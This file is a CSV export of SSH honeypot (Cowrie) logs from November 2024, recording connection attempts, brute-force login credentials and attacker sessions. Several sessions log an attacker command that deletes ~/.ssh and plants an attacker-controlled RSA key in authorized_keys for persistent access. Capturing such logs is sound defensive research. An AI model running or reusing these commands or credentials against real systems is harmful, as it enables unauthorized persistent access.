eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.session.closed,176.96.243.175,,,,47808c4988a6,,,,,Connection lost after 10 seconds,localhost,2024-11-24T04:42:53.153712Z
cowrie.session.closed,176.96.243.175,,,,6ef682bdbcb4,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:42:53.154430Z
cowrie.session.connect,51.159.103.10,61000,172.233.154.19,2222,012a0cee8dd2,ssh,,,,New connection: 51.159.103.10:61000 (172.233.154.19:2222) [session: 012a0cee8dd2],localhost,2024-11-24T04:43:26.145171Z
cowrie.session.closed,51.159.103.10,,,,012a0cee8dd2,,,,,Connection lost after 0 seconds,localhost,2024-11-24T04:43:26.285354Z
cowrie.session.connect,195.158.4.210,36276,172.233.154.19,2222,9ffe148a49fb,ssh,,,,New connection: 195.158.4.210:36276 (172.233.154.19:2222) [session: 9ffe148a49fb],localhost,2024-11-24T04:44:02.181595Z
cowrie.client.version,195.158.4.210,,,,9ffe148a49fb,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:44:02.182209Z
cowrie.client.kex,195.158.4.210,,,,9ffe148a49fb,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:44:02.420356Z
cowrie.login.failed,195.158.4.210,,,,9ffe148a49fb,,,,,login attempt [admin/relay] failed,localhost,2024-11-24T04:44:03.405089Z
cowrie.session.closed,195.158.4.210,,,,9ffe148a49fb,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:44:04.642965Z
cowrie.session.connect,176.96.243.175,47364,172.233.154.19,2222,a792dd12585d,ssh,,,,New connection: 176.96.243.175:47364 (172.233.154.19:2222) [session: a792dd12585d],localhost,2024-11-24T04:44:31.862005Z
cowrie.client.version,176.96.243.175,,,,a792dd12585d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:44:31.872641Z
cowrie.client.kex,176.96.243.175,,,,a792dd12585d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:44:32.315617Z
cowrie.login.success,176.96.243.175,,,,a792dd12585d,,,,,login attempt [root/Pas$wOrd] succeeded,localhost,2024-11-24T04:44:34.066371Z
cowrie.session.params,176.96.243.175,,,,a792dd12585d,,,,,[],localhost,2024-11-24T04:44:34.597818Z
cowrie.command.input,176.96.243.175,,,,a792dd12585d,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T04:44:34.598216Z
cowrie.command.failed,176.96.243.175,,,,a792dd12585d,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T04:44:34.599082Z
cowrie.log.closed,176.96.243.175,,,,a792dd12585d,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T04:44:35.197328Z
cowrie.session.params,176.96.243.175,,,,a792dd12585d,,,,,[],localhost,2024-11-24T04:44:35.450681Z
cowrie.command.input,176.96.243.175,,,,a792dd12585d,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T04:44:35.451118Z
cowrie.session.file_download,176.96.243.175,,,,a792dd12585d,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T04:44:36.018914Z
cowrie.log.closed,176.96.243.175,,,,a792dd12585d,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T04:44:36.019407Z
cowrie.session.connect,176.96.243.175,34080,172.233.154.19,2222,2b884b45dcf6,ssh,,,,New connection: 176.96.243.175:34080 (172.233.154.19:2222) [session: 2b884b45dcf6],localhost,2024-11-24T04:44:36.264012Z
cowrie.client.version,176.96.243.175,,,,2b884b45dcf6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:44:36.264521Z
cowrie.client.kex,176.96.243.175,,,,2b884b45dcf6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:44:36.659015Z
cowrie.login.failed,176.96.243.175,,,,2b884b45dcf6,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T04:44:37.960402Z
cowrie.session.closed,176.96.243.175,,,,2b884b45dcf6,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:44:39.196589Z
cowrie.session.connect,176.96.243.175,34096,172.233.154.19,2222,df3e0ad8a838,ssh,,,,New connection: 176.96.243.175:34096 (172.233.154.19:2222) [session: df3e0ad8a838],localhost,2024-11-24T04:44:39.748083Z
cowrie.client.version,176.96.243.175,,,,df3e0ad8a838,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:44:39.752466Z
cowrie.client.kex,176.96.243.175,,,,df3e0ad8a838,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:44:40.088953Z
cowrie.login.success,176.96.243.175,,,,df3e0ad8a838,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T04:44:41.840764Z
cowrie.session.closed,176.96.243.175,,,,a792dd12585d,,,,,Connection lost after 10 seconds,localhost,2024-11-24T04:44:42.235660Z
cowrie.session.closed,176.96.243.175,,,,df3e0ad8a838,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:44:42.236141Z
cowrie.session.connect,195.158.4.210,44188,172.233.154.19,2222,8a3472e28813,ssh,,,,New connection: 195.158.4.210:44188 (172.233.154.19:2222) [session: 8a3472e28813],localhost,2024-11-24T04:45:29.835514Z
cowrie.client.version,195.158.4.210,,,,8a3472e28813,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:45:29.836174Z
cowrie.client.kex,195.158.4.210,,,,8a3472e28813,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:45:30.072292Z
cowrie.login.failed,195.158.4.210,,,,8a3472e28813,,,,,login attempt [sftpuser/1q2w3e4r] failed,localhost,2024-11-24T04:45:31.056708Z
cowrie.session.closed,195.158.4.210,,,,8a3472e28813,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:45:32.295073Z
cowrie.session.connect,176.96.243.175,40248,172.233.154.19,2222,512cd2957d8c,ssh,,,,New connection: 176.96.243.175:40248 (172.233.154.19:2222) [session: 512cd2957d8c],localhost,2024-11-24T04:46:24.488528Z
cowrie.client.version,176.96.243.175,,,,512cd2957d8c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:46:24.492918Z
cowrie.client.kex,176.96.243.175,,,,512cd2957d8c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:46:24.891489Z
cowrie.login.success,176.96.243.175,,,,512cd2957d8c,,,,,login attempt [root/1Qaz!wsx] succeeded,localhost,2024-11-24T04:46:28.032255Z
cowrie.session.params,176.96.243.175,,,,512cd2957d8c,,,,,[],localhost,2024-11-24T04:46:28.661048Z
cowrie.command.input,176.96.243.175,,,,512cd2957d8c,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T04:46:28.661399Z
cowrie.command.failed,176.96.243.175,,,,512cd2957d8c,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T04:46:28.662064Z
cowrie.log.closed,176.96.243.175,,,,512cd2957d8c,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T04:46:29.174485Z
cowrie.session.params,176.96.243.175,,,,512cd2957d8c,,,,,[],localhost,2024-11-24T04:46:29.504396Z
cowrie.command.input,176.96.243.175,,,,512cd2957d8c,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T04:46:29.504755Z
cowrie.session.file_download,176.96.243.175,,,,512cd2957d8c,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T04:46:29.927129Z
cowrie.log.closed,176.96.243.175,,,,512cd2957d8c,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T04:46:29.927710Z
cowrie.session.connect,176.96.243.175,40256,172.233.154.19,2222,12bb8ff2fee9,ssh,,,,New connection: 176.96.243.175:40256 (172.233.154.19:2222) [session: 12bb8ff2fee9],localhost,2024-11-24T04:46:30.215012Z
cowrie.client.version,176.96.243.175,,,,12bb8ff2fee9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:46:30.224784Z
cowrie.client.kex,176.96.243.175,,,,12bb8ff2fee9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:46:30.635314Z
cowrie.login.failed,176.96.243.175,,,,12bb8ff2fee9,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T04:46:32.565769Z
cowrie.session.closed,176.96.243.175,,,,12bb8ff2fee9,,,,,Connection lost after 3 seconds,localhost,2024-11-24T04:46:33.797827Z
cowrie.session.connect,176.96.243.175,47974,172.233.154.19,2222,75ed56c0b3e7,ssh,,,,New connection: 176.96.243.175:47974 (172.233.154.19:2222) [session: 75ed56c0b3e7],localhost,2024-11-24T04:46:34.209877Z
cowrie.client.version,176.96.243.175,,,,75ed56c0b3e7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:46:34.210812Z
cowrie.client.kex,176.96.243.175,,,,75ed56c0b3e7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:46:34.687911Z
cowrie.login.success,176.96.243.175,,,,75ed56c0b3e7,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T04:46:36.317704Z
cowrie.session.closed,176.96.243.175,,,,512cd2957d8c,,,,,Connection lost after 12 seconds,localhost,2024-11-24T04:46:36.746377Z
cowrie.session.closed,176.96.243.175,,,,75ed56c0b3e7,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:46:36.747238Z
cowrie.session.connect,195.158.4.210,39900,172.233.154.19,2222,e8cb45fd8093,ssh,,,,New connection: 195.158.4.210:39900 (172.233.154.19:2222) [session: e8cb45fd8093],localhost,2024-11-24T04:47:00.234107Z
cowrie.client.version,195.158.4.210,,,,e8cb45fd8093,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:47:00.234779Z
cowrie.client.kex,195.158.4.210,,,,e8cb45fd8093,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:47:00.471015Z
cowrie.login.failed,195.158.4.210,,,,e8cb45fd8093,,,,,login attempt [ts3/teamspeak3user] failed,localhost,2024-11-24T04:47:01.453488Z
cowrie.session.closed,195.158.4.210,,,,e8cb45fd8093,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:47:02.691512Z
cowrie.session.connect,176.96.243.175,53616,172.233.154.19,2222,4a48d7bb7a3c,ssh,,,,New connection: 176.96.243.175:53616 (172.233.154.19:2222) [session: 4a48d7bb7a3c],localhost,2024-11-24T04:48:13.561809Z
cowrie.client.version,176.96.243.175,,,,4a48d7bb7a3c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:48:13.584445Z
cowrie.client.kex,176.96.243.175,,,,4a48d7bb7a3c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:48:14.084362Z
cowrie.login.success,176.96.243.175,,,,4a48d7bb7a3c,,,,,login attempt [root/123456312] succeeded,localhost,2024-11-24T04:48:15.494132Z
cowrie.session.params,176.96.243.175,,,,4a48d7bb7a3c,,,,,[],localhost,2024-11-24T04:48:16.101715Z
cowrie.command.input,176.96.243.175,,,,4a48d7bb7a3c,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-24T04:48:16.102108Z
cowrie.command.failed,176.96.243.175,,,,4a48d7bb7a3c,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-24T04:48:16.102767Z
cowrie.log.closed,176.96.243.175,,,,4a48d7bb7a3c,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-24T04:48:16.683893Z
cowrie.session.params,176.96.243.175,,,,4a48d7bb7a3c,,,,,[],localhost,2024-11-24T04:48:17.077933Z
cowrie.command.input,176.96.243.175,,,,4a48d7bb7a3c,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-24T04:48:17.078321Z
cowrie.session.file_download,176.96.243.175,,,,4a48d7bb7a3c,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-24T04:48:17.456035Z
cowrie.log.closed,176.96.243.175,,,,4a48d7bb7a3c,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-24T04:48:17.456535Z
cowrie.session.connect,176.96.243.175,53046,172.233.154.19,2222,bc06bf8588b3,ssh,,,,New connection: 176.96.243.175:53046 (172.233.154.19:2222) [session: bc06bf8588b3],localhost,2024-11-24T04:48:17.710892Z
cowrie.client.version,176.96.243.175,,,,bc06bf8588b3,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:48:17.712786Z
cowrie.client.kex,176.96.243.175,,,,bc06bf8588b3,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:48:18.379057Z
cowrie.login.failed,176.96.243.175,,,,bc06bf8588b3,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-24T04:48:19.799423Z
cowrie.session.closed,176.96.243.175,,,,bc06bf8588b3,,,,,Connection lost after 3 seconds,localhost,2024-11-24T04:48:21.094441Z
cowrie.session.connect,176.96.243.175,53056,172.233.154.19,2222,209917efb561,ssh,,,,New connection: 176.96.243.175:53056 (172.233.154.19:2222) [session: 209917efb561],localhost,2024-11-24T04:48:21.629088Z
cowrie.client.version,176.96.243.175,,,,209917efb561,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:48:21.633899Z
cowrie.client.kex,176.96.243.175,,,,209917efb561,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-24T04:48:21.871090Z
cowrie.login.success,176.96.243.175,,,,209917efb561,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-24T04:48:23.621955Z
cowrie.session.closed,176.96.243.175,,,,4a48d7bb7a3c,,,,,Connection lost after 10 seconds,localhost,2024-11-24T04:48:23.853919Z
cowrie.session.closed,176.96.243.175,,,,209917efb561,,,,,Connection lost after 2 seconds,localhost,2024-11-24T04:48:23.854371Z
cowrie.session.connect,195.158.4.210,46416,172.233.154.19,2222,451866d70ece,ssh,,,,New connection: 195.158.4.210:46416 (172.233.154.19:2222) [session: 451866d70ece],localhost,2024-11-24T04:48:24.130547Z
cowrie.client.version,195.158.4.210,,,,451866d70ece,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-24T04:48:24.131105Z
